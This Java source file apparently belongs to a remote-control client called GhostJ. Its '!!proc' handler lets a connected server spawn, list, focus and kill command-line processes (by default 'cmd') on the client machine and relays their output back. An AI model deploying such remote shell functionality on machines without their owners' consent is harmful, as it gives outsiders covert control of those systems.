package com.ghostj.client.func;

import com.ghostj.client.cmd.AbstractFunc;
import com.ghostj.client.cmd.AbstractProcessor;
import com.ghostj.client.core.ClientMain;
import com.ghostj.client.conn.HandleConn;
import com.ghostj.client.core.ProcessCmd;
import com.ghostj.util.TimeUtil;

/**
 * 增删改查每个命令行执行对象的指令
 * @author Rock Chin
 */
public class FuncProcess implements AbstractFunc {
    @Override
    public String getFuncName() {
        return "!!proc";
    }

    @Override
    public String[] getParamsModel() {
        return new String[]{"<oper> [params]"};
    }

    @Override
    public String getDescription() {
        return "操作被该客户端发起的命令行操作";
    }

    @Override
    public int getMinParamsAmount() {
        return 1;
    }

    @Override
    public void run(String[] params, String cmd, AbstractProcessor processor) {
        oper:switch (params[0]){
            // FIXME: 2020/9/6 所有的执行完毕的操作放到switch后面
            case "focus":{
                if(params.length<2){
                    HandleConn.writeToServer("proc focus命令语法不正确.\n");
                    break;
                }
                for(String key:FuncDefault.processList.keySet()){
                    if(key.startsWith(params[1])){
                        FuncDefault.focusedProcess=FuncDefault.processList.get(key);
                        HandleConn.writeToServer("聚焦process:"+key+"\n");
                        FuncDefault.focusedProcess.flush();
                        break oper;
                    }
                }
                HandleConn.writeToServer("找不到"+params[1]+"开头的process\n");
                break oper;
            }
            case "ls":{
                new Thread(()-> {
                    try {
                        HandleConn.writeToServer("列表所有此客户端已连接的process(" + FuncDefault.processList.size()
                                + ")\nkey\tinitCmd\tstartTime\tstate\n");
                        for (String key :FuncDefault.processList.keySet()) {
                            HandleConn.writeToServer(key + "      " + FuncDefault.processList.get(key).cmd + "         "
                                    + TimeUtil.millsToMMDDHHmmSS(FuncDefault.processList.get(key).startTime) + "   " + (FuncDefault.focusedProcess == FuncDefault.processList.get(key)) + "\n");
                        }
                        HandleConn.writeToServer("列表完成.\n");
                    } catch (Exception e) {
                        e.printStackTrace();
                    }
                }).start();
                break oper;
            }
            case "bg":
            case "new":{
                String name;
                if(params.length<2){
                    name=""+ProcessCmd.UID_COUNT++;
                }else{
                    name=params[1];
                }
                HandleConn.writeToServer("新建"+(params[0].equalsIgnoreCase("bg")?"后台":"")+"进程:"+name+"\n");
                ProcessCmd processCmd;
                if(params.length>=3){//如果有初始执行指令
                    processCmd = new ProcessCmd(name);
                    //包装要执行的命令
                    StringBuffer cmdStr=new StringBuffer();
                    String[] arr=subArray(params,2,params.length);
                    for(int i=0;i<arr.length;i++){
                        cmdStr.append(arr[i]+" ");
                    }
                    processCmd.cmd =cmdStr.toString();
                    FuncDefault.processList.put(name,processCmd);
                    processCmd.start();
                }else {
                    processCmd = new ProcessCmd(name);
                    processCmd.cmd ="cmd";
                    FuncDefault.processList.put(name,processCmd);
                    processCmd.start();
                }
                if(params[0].equalsIgnoreCase("new")) {
                    FuncDefault.focusedProcess = FuncDefault.processList.get(name);
                    HandleConn.writeToServer("聚焦process:" + name + "\n");
                }
                break oper;
            }
            case "disc":{
                if(params.length<2){
                    HandleConn.writeToServer("proc disc命令语法不正确.\n");
                    break oper;
                }
                //注意！！这里仅仅是断开与进程的连接而不是结束进程
                if(FuncDefault.processList.containsKey(params[1])){
                    try {
                        FuncDefault.processList.get(params[1]).process.destroy();
                        FuncDefault.removeProcess(params[1]);
                    }catch (Exception e){
                        HandleConn.writeToServer("断连process时出现错误\n"+ ClientMain.getErrorInfo(e));
                    }
                }else {
                    HandleConn.writeToServer("仅能使用全名来断连process\n");
                }
                break oper;
            }
            default:{
                HandleConn.writeToServer("!!proc 命令语法不正确\n");
                break oper;
            }
        }
        HandleConn.sendFinishToServer();
    }
    /**
     * 取部分数组
     * @param array 原数组
     * @param start 起始位置(包含)
     * @param end 终点位置(不含)
     * @return 截取出的数组
     */
    private String[] subArray(String[] array,int start,int end){
        String[] result=new String[end-start];
        for(int i=start;i<end;i++){
            result[i-start]=array[i];
        }
        return result;
    }
}
